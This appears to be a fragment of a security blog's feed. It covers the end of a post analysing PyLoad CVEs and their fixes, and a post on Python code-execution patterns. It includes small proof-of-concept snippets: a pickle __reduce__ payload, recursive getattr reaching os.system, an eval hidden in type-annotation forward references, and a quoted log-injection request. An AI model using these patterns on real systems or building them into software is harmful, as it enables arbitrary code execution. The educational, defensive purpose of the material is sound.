+Could not build url for endpoint &#39;http:///example.com&#39;. Did you mean &#39;hello_world&#39; instead?
+127.0.0.1 - - [16/Mar/2024 11:19:45] &#34;GET /?next=http:///example.com HTTP/1.1&#34; 200 
+</code></pre><hr>
+<h2 id="cve-2024-22416-cross-site-request-forgery">CVE-2024-22416 (Cross Site Request Forgery)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22416">CVE-2024-22416</a> is a cross site request forgery (CSRF) vulnerability in PyLoad. The <code>SameSite</code> attribute in the session cookie used with PyLoad APIs is not set to <code>SameSite: strict</code>. This allows an attacker to make API calls using GET requests on behalf of other users via a CSRF attack, thereby performing actions on behalf of said users. The details provided here are taken from the <a href="https://github.com/pyload/pyload/security/advisories/GHSA-pgpj-v85q-h5fm">advisory</a> available in the PyLoad repository.</p>
+<h3 id="vulnerability-1">Vulnerability</h3>
+<p>There is not much to explain for this CVE. It is a textbook CSRF vulnerability, as the cookie is not prevented from being sent in cross site requests. If an attacker can trick a legitimate user to visit a malicious site, which has an embedded GET request to a PyLoad API, the browser will make the GET request and send the cookies of the legitimate user with the request (provided the user was logged in, and had a valid session cookie in the cookie jar). This will lead to PyLoad performing the action associated with the API as if the legitimate user is performing it. The example in the advisory mentions the <code>/add_user</code> API, which can be called with a username and a password like <code>api/add_user/%22username%22,%22password%22</code>. When triggered via an admin&rsquo;s session token, a user with username  <code>username</code> and password <code>password</code> will be created with admin privileges.</p>
+<h3 id="fix-1">Fix</h3>
+<p>The vulnerability is fixed by <a href="https://github.com/pyload/pyload/commit/1374c824271cb7e927740664d06d2e577624ca3e">this PR</a>.</p>
+<p>Flask provides a <code>config</code> object that allows setting certain Flask configuration values. One of the values that can be configured is <a href="https://flask.palletsprojects.com/en/3.0.x/config/#SESSION_COOKIE_SAMESITE"><code>SESSION_COOKIE_SAMESITE</code></a> that sets the value of the <code>SameSite</code> attribute of the session cookie. The fix is setting this to <code>Strict</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;SESSION_COOKIE_SAMESITE&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Strict&#34;</span>
+</span></span></code></pre></div><hr>
+<h2 id="cve-2024-21644-flask-configuration-leak">CVE-2024-21644 (Flask configuration leak)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21644">CVE-2024-21644</a> is a configuration leak vulnerabilty in PyLoad which allows an unauthenticated user to view the Flask config used by PyLoad including secrets by browsing to a specific URL.The details provided here are taken from the <a href="https://github.com/pyload/pyload/security/advisories/GHSA-mqpq-2p68-46fv">advisory</a> available in the PyLoad repository.</p>
+<h3 id="vulnerability-2">Vulnerability</h3>
+<p>This vulnerability is caused due to an interesting mix of circumstances. First, there is a route <code>/render/&lt;path:filename&gt;</code> which allows an unautheticated user to view predefined templates.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/render/&lt;path:filename&gt;&#34;</span>, endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;render&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render</span>(filename):
+</span></span><span style="display:flex;"><span>    mimetype <span style="color:#f92672">=</span> mimetypes<span style="color:#f92672">.</span>guess_type(filename)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> render_template(filename)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>Response(data, mimetype<span style="color:#f92672">=</span>mimetype)
+</span></span></code></pre></div><p>Next, there is a template <code>info.html</code> which renders a variable named <code>config</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">tr</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">td</span>&gt;{{ _(&#34;Config folder:&#34;) }}&lt;/<span style="color:#f92672">td</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">td</span>&gt;{{ config }}&lt;/<span style="color:#f92672">td</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">tr</span>&gt;
+</span></span></code></pre></div><p>In normal operation, the value of config is supposed to be provided using the <code>render_template</code> function. In this case <code>**context</code> provides the values to display to <code>info.html</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>context <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;python&#34;</span>: sys<span style="color:#f92672">.</span>version,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;os&#34;</span>: <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>join((os<span style="color:#f92672">.</span>name, sys<span style="color:#f92672">.</span>platform) <span style="color:#f92672">+</span> extra),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;version&#34;</span>: api<span style="color:#f92672">.</span>get_server_version(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;folder&#34;</span>: PKGDIR,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;config&#34;</span>: api<span style="color:#f92672">.</span>get_userdir(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;download&#34;</span>: conf[<span style="color:#e6db74">&#34;general&#34;</span>][<span style="color:#e6db74">&#34;storage_folder&#34;</span>][<span style="color:#e6db74">&#34;value&#34;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;freespace&#34;</span>: format<span style="color:#f92672">.</span>size(api<span style="color:#f92672">.</span>free_space()),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;webif&#34;</span>: conf[<span style="color:#e6db74">&#34;webui&#34;</span>][<span style="color:#e6db74">&#34;port&#34;</span>][<span style="color:#e6db74">&#34;value&#34;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;language&#34;</span>: conf[<span style="color:#e6db74">&#34;general&#34;</span>][<span style="color:#e6db74">&#34;language&#34;</span>][<span style="color:#e6db74">&#34;value&#34;</span>],
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;info.html&#34;</span>, <span style="color:#f92672">**</span>context)
+</span></span></code></pre></div><p>However, all Flask templates also receive the Flask configuration as a variable named <code>config</code>. Therefore, when <code>info.html</code> is requested using <code>/render</code>, since a second parameter is not sent to <code>render_template</code>, the <code>config</code> value used to render <code>info.html</code> is the Flask configuration which contains sensitive information. These sensitive values are then displayed to an unauthenticated user.</p>
+<h3 id="fix-2">Fix</h3>
+<p>This issue is fixed by <a href="https://github.com/pyload/pyload/commit/bb22063a875ffeca357aaf6e2edcd09705688c40">this PR</a>. The fix is quite simple: the <code>config</code> variable in <code>info.html</code> is renamed to <code>config_folder</code>.</p>
+<hr>
+<h2 id="cve-2024-21645-log-injection">CVE-2024-21645 (Log Injection)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21645">CVE-2024-21645</a> is a log injection vulnerability in PyLoad that allows an attacker to inject arbitrary logs by sending a crafted <code>username</code> parameter while attempting to log in.</p>
+<h3 id="vulnerability-3">Vulnerability</h3>
+<p>PyLoad logs the username provided on an unsuccessful login attempt.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>api <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>current_app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;PYLOAD_API&#34;</span>]
+</span></span><span style="display:flex;"><span>user_info <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>check_auth(user, password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user_info:
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Login failed for user &#39;</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
+</span></span></code></pre></div><p>A login attempt can be made using a request like</p>
+<pre tabindex="0"><code>http://localhost:8000/login?next=http://localhost:8000/&#39; -X POST -H &#39;Content-Type: application/x-www-form-urlencoded&#39; --data-raw $&#39;do=login&amp;username=user&amp;password=password&amp;submit=Login&#39;
+</code></pre><p>The value sent as the <code>username</code> parameter is logged as-is without any sanitization. Therefore, an attacker can craft a <code>username</code> param with newlines (and log string format) and inject a log. A malicious request has been provided by the reporter in the advisory</p>
+<pre tabindex="0"><code>http://localhost:8000/login?next=http://localhost:8000/&#39; -X POST -H &#39;Content-Type: application/x-www-form-urlencoded&#39; --data-raw $&#39;do=login&amp;username=wrong\&#39;%0a[2024-01-05 02:49:19]  HACKER               PinkDraconian  THIS ENTRY HAS BEEN INJECTED&amp;password=wrong&amp;submit=Login&#39;
+</code></pre><p>This will insert a log like</p>
+<pre tabindex="0"><code>2024-01-05 02:49:19]  HACKER               PinkDraconian  THIS ENTRY HAS BEEN INJECTED
+</code></pre><h3 id="fix-3">Fix</h3>
+<p>This issue is fixed by <a href="https://github.com/pyload/pyload/commit/4159a1191ec4fe6d927e57a9c4bb8f54e16c381d">this PR</a>.</p>
+<p>The fix is to sanitize the value of the username paramater to remove newlines and carriage returns.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span> api <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>current_app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;PYLOAD_API&#34;</span>]
+</span></span><span style="display:flex;"><span>user_info <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>check_auth(user, password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sanitized_user <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user_info:
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Login failed for user &#39;</span><span style="color:#e6db74">{</span>sanitized_user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify(<span style="color:#66d9ef">False</span>)
+</span></span></code></pre></div><hr>
+<p>I enjoyed analyzing these CVEs and fixes. I especially found the <code>urlparse</code> issue in CVE-2024-24808 very interesting, since I was not aware of the described behavior of <code>urlparse</code>. As a side effect of analyzing these CVEs, I also learnt a few things about Flask internals. I&rsquo;m still hunting my first CVE, and studying these advisories has taught me lots of useful techniques, tips, and tricks for my search. Hopefully, I will find the CVE soon. If not, there&rsquo;s plenty of CVEs to analyze and learn from!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Exploring Python Code Execution Patterns for Fun and Profit</title>
+            <link>http://localhost:1313/posts/python-rce/</link>
+            <pubDate>Sun, 17 Mar 2024 10:01:34 -0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/python-rce/</guid>
+            <description>&lt;p&gt;Recently, I was looking at the Semgrep output for an open source project and I saw an interesting finding about potential arbitrary code execution. The code essentially ran an &lt;code&gt;eval&lt;/code&gt; but the interesting part was converting Python code to an abstract syntax tree, compiling it to bytecode, and evaluating it. This made me curious about other unsafe ways to write Python code that could lead to code execution. In this article, I will discuss a few patterns that I learnt about through my limited research.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>Recently, I was looking at the Semgrep output for an open source project and I saw an interesting finding about potential arbitrary code execution. The code essentially ran an <code>eval</code> but the interesting part was converting Python code to an abstract syntax tree, compiling it to bytecode, and evaluating it. This made me curious about other unsafe ways to write Python code that could lead to code execution. In this article, I will discuss a few patterns that I learnt about through my limited research.</p>
+<p>Notes:</p>
+<ul>
+<li>This is by no means a complete list of all patterns that can lead to arbitrary code execution in Python.</li>
+<li>Some of these examples are contrived, and might not make any sense in the real world. I merely use them to demonstrate vulnerable code patterns.</li>
+</ul>
+<h2 id="basic-patterns">Basic Patterns</h2>
+<p>Python provides many ways of running system commands or arbitrary code in its <code>os</code> and <code>subprocess</code> modules. Some examples include:</p>
+<ul>
+<li><a href="https://docs.python.org/3/library/os.html"><code>os.system</code>, <code>os.popen</code>, <code>os.execve</code></a></li>
+<li><a href="https://docs.python.org/3/library/subprocess.html"><code>subprocess.Popen</code>, <code>subprocess.run</code>, <code>subprocess.check_call</code>, <code>subprocess.check_output</code></a></li>
+</ul>
+<p>While <code>subprocess</code> functions are designed to be safer than <code>os</code> functions, allowing code execution via untrusted input should always be avoided. Some examples of untrusted inputs leading to remote code execution can be seen in <a href="https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/">these vulnerabilities</a> reported against Roxy-WI. Here, user input is directly concatenated to commands used in calls to <code>os.system</code>, <code>subprocess.Popen</code> and <code>ssh.exec_command</code>.</p>
+<p>It is also possible to run arbitrary Python code using <a href="https://docs.python.org/3/library/functions.html#eval"><code>eval</code></a> and <a href="https://docs.python.org/3/library/functions.html#exec"><code>exec</code></a>.</p>
+<h2 id="eval-and-exec-with-abstract-syntax-trees"><code>eval</code> and <code>exec</code> with Abstract Syntax Trees</h2>
+<p><code>eval</code> and <code>exec</code> require a string, bytes or code object. There is also <a href="https://docs.python.org/3/library/functions.html#compile"><code>compile</code></a> which can compile code into bytecode. The compiled bytecode can then be used with <code>eval</code> or <code>exec</code>. However <code>compile</code> requires a string, bytes or AST object. Therefore, just by themselves one cannot <code>eval</code> or <code>exec</code> a function like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>eval(my_function)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">TypeError</span>: eval arg <span style="color:#ae81ff">1</span> must be a string, bytes <span style="color:#f92672">or</span> code object
+</span></span></code></pre></div><p>Although I can&rsquo;t think of any good reasons for evaluating a function like this, someone might have some use case. They can then convert the function to an AST first, compile it to bytecode, and evaluate or execute it as needed. If a malicious user can control what function is being evaluated or executed, they will achieve code execution.</p>
+<h3 id="code-example">Code example</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">eval_node</span>(func):
+</span></span><span style="display:flex;"><span>    tree <span style="color:#f92672">=</span> ast<span style="color:#f92672">.</span>parse(textwrap<span style="color:#f92672">.</span>dedent(inspect<span style="color:#f92672">.</span>getsource(func)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> node <span style="color:#f92672">in</span> ast<span style="color:#f92672">.</span>walk(tree):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(node, ast<span style="color:#f92672">.</span>Call):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> eval(compile(ast<span style="color:#f92672">.</span>Expression(node), <span style="color:#e6db74">&#34;fl&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_function</span>():
+</span></span><span style="display:flex;"><span>    subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#34;id&#34;</span>])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(eval_node(my_function))
+</span></span></code></pre></div><p>Here, <code>my_function</code> is parsed into an AST, which is then compiled to bytecode before being evaluated.</p>
+<h2 id="recursive-attribute-lookup">Recursive attribute lookup</h2>
+<p>I learnt about this pattern while reading a <a href="https://snyk.io/blog/python-rce-vulnerability/">CVE report for Celery</a> by Calum Hutton. I would highly recommend reading the original article, but I will summarize the finding here.</p>
+<p>Python allows performing recursive lookups on objects to get their attributes or sub-attributes. This means it is possible to traverse from one module to another, and use functions present in the other module, if the first module imports the subsequent module(s). This also means if an application exposes functionality that allows user controlled object traversal, the user might be able to manipulate the traversal and get references to functions such as <code>os.system</code>, therefore acheiving arbitrary code execution. (I am using <code>os.system</code> as example, but this would apply to something like <code>subprocess.run</code> too.)</p>
+<p>Not every module imports the <code>os</code> module, so this pattern only affects modules import <code>os</code> and thus have <code>os</code> as an attribute . Some examples of such modules are:</p>
+<ul>
+<li><a href="https://github.com/python/cpython/blob/main/Lib/random.py#L62"><code>random</code></a> (<code>os</code> is imported as <code>_os</code>)</li>
+<li><a href="https://github.com/python/cpython/blob/main/Lib/shutil.py#L7"><code>shutil</code></a></li>
+<li><a href="https://github.com/python/cpython/blob/main/Lib/pathlib/__init__.py#L10"><code>pathlib</code></a></li>
+<li><a href="https://github.com/python/cpython/blob/main/Lib/posixpath.py#L25"><code>posixpath</code></a></li>
+</ul>
+<p>If you are interested in finding more modules, you can look at the Python <a href="https://github.com/python/cpython/tree/main/Lib">sourcecode</a> where the modules are defined and check if the module imports <code>os</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>getattr(pathlib, <span style="color:#e6db74">&#34;os&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/Users/user/.pyenv/versions/3.9.5/lib/python3.9/os.py&#39;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>getattr(shutil, <span style="color:#e6db74">&#34;os&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/Users/user/.pyenv/versions/3.9.5/lib/python3.9/os.py&#39;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>getattr(random, <span style="color:#e6db74">&#34;_os&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/Users/user/.pyenv/versions/3.9.5/lib/python3.9/os.py&#39;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>getattr(posixpath, <span style="color:#e6db74">&#34;os&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/Users/user/.pyenv/versions/3.9.5/lib/python3.9/os.py&#39;</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><h3 id="code-example-1">Code example</h3>
+<p>This snippet is adapted from Celery source code presented in the original article.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">code_exec</span>(d):
+</span></span><span style="display:flex;"><span>    _module <span style="color:#f92672">=</span> d[<span style="color:#e6db74">&#34;module&#34;</span>]
+</span></span><span style="display:flex;"><span>    _type <span style="color:#f92672">=</span> d[<span style="color:#e6db74">&#34;type&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        cls <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>modules[_module]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> _type<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>):
+</span></span><span style="display:flex;"><span>            cls <span style="color:#f92672">=</span> getattr(cls, name)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    _msg <span style="color:#f92672">=</span> d[<span style="color:#e6db74">&#34;message&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(_msg, (tuple, list)):
+</span></span><span style="display:flex;"><span>            d <span style="color:#f92672">=</span> cls(<span style="color:#f92672">*</span>_msg)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            d <span style="color:#f92672">=</span> cls(_msg)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;module&#34;</span>: <span style="color:#e6db74">&#34;os&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;system&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;id&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The above snippet will lead to running <code>os.system(&quot;id&quot;)</code>. First <code>cls</code> is instantiated as <code>os</code> using <code>sys.modules</code>. It is then updated to the <code>os.system</code> function via recursive lookup using <code>getattr</code>. Finally code is executed when <code>cls(_msg)</code> is evaluated.</p>
+<h3 id="cve-2023-33733">CVE-2023-33733</h3>
+<p>CVE-2023-3373 is a CVE in the <code>reportlab</code> Python library. This was reported by Elyas Damej, who has published a great <a href="https://github.com/c53elyas/CVE-2023-33733">write-up</a> describing the vulnerabilties and its technical details. This is a very interesting CVE since it combines recursive attribute lookup and using <code>eval</code> to execute arbitrary code.</p>
+<p>I would recommend reading the original write-up, but I&rsquo;ll summarize it here. The <code>reportlab</code> library allows creating PDFs using Python. In 2019, a <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17626">CVE</a> was discovered which allowed remote code execution through the <code>color</code> HTML tag which is passed to <code>eval</code> without proper sanitization. To fix this  <code>rl_safe_eval</code> sandbox was implemented where all Python builtins functions are removed and many builtin functions are overriden to prevent access to dangerous functions that could lead to code execution. This sandbox was bypassed by creating a new class <code>Word</code> which is specifically crafted to bypass the checks in the sandbox. Following this, the <code>__globals__</code> attribute of <code>Word</code> is accessed and used to call <code>os.system</code></p>
+<h2 id="pickle">Pickle</h2>
+<p>In Python, the <code>pickle</code> module is used for serializing and deserializing objects. Serialization refers to the process of converting objects in memory to a byte stream. Deserialization is the reverse process, where the byte stream is converted back into objects in memory. Serialization is performed by <code>pickle.dump</code> / <code>pickle.dumps</code> and deserialization is performed by <code>pickle.load / pickle.loads</code>.</p>
+<p>Python allows specifying how an object should be pickled by using the <code>__reduce__</code> method. The <code>__reduce__</code> function can return a tuple which represents callable code along with arguments to the callable code. When this object is deserialized, Python will run the callable code in the object&rsquo;s <code>__reduce__</code> method. This gives one the ability to create an object that can lead to code execution when deserialized.</p>
+<h3 id="code-example-2">Code example</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Payload</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#39;whoami&#39;</span>,))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>serialized <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(Payload())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pickle<span style="color:#f92672">.</span>loads(serialized)
+</span></span></code></pre></div><p>When an object of the class <code>Payload</code> is deserialized using <code>pickle.loads()</code>, the <code>__reduce__</code> function is called. This function returns callable code <code>os.system('whoami')</code>, which is then executed.</p>
+<p>This behavior of <code>pickle</code> has led to many CVEs. Some examples:</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-23930">CVE-2023-23930</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-34668">CVE-2022-34668</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33026">CVE-2021-33026</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-22083">CVE-2020-22083</a></li>
+</ul>
+<h2 id="forward-references-and-typingget_type_hints">Forward References and <code>typing.get_type_hints</code></h2>
+<p>I learnt of this technique from a <a href="https://stackoverflow.com/questions/25353753/python-can-i-safely-unpickle-untrusted-data">Stack Overflow</a> post about dangers of unpickling untrusted data.</p>
+<p>A forward reference is a reference to a variable, function, or class that is defined later in the code. One place where forward references can be used is with <code>typing.get_type_hints</code>.</p>
+<p>From <a href="https://docs.python.org/3/library/typing.html#typing.get_type_hints">documentation</a>: <code>typing.get_type_hints</code> returns a dictionary containing type hints for a function, method, module or class object. In addition, forward references encoded as string literals are handled by evaluating them in globals and locals namespaces.</p>
+<p>This behavior can be misused to run arbitrary code, by specifying the code as a forward reference. Setting the <code>__anotations__</code> attribute of an object to such a forward reference does the trick.</p>
+<h3 id="code-example-3">Code example</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Payload</span>(object):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>__annotations__ <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;x&#34;</span>: <span style="color:#e6db74">&#34;&#34;&#34;eval(&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)&#34;&#34;&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> Payload()
+</span></span><span style="display:flex;"><span>print(typing<span style="color:#f92672">.</span>get_type_hints(p))
+</span></span></code></pre></div><p>Here, we specify a forward reference which imports <code>os</code> and calls <code>os.system</code></p>
+<p>It is possible that <code>typing.get_type_hints</code> is used internally by other Python functions, which could make these functions also susceptible to similar misuse. The Stack Overflow post mentions <code>functools.singledispatch</code> which has inner function <code>register</code>. The <code>register</code> function calls <code>typing.get_type_hints</code>. I tried using the above <code>Payload</code> class with <code>functools.singledispatch</code> but was not able to achieve code execution. Therefore, I leave this as an exercise to the reader.</p>
+<hr>
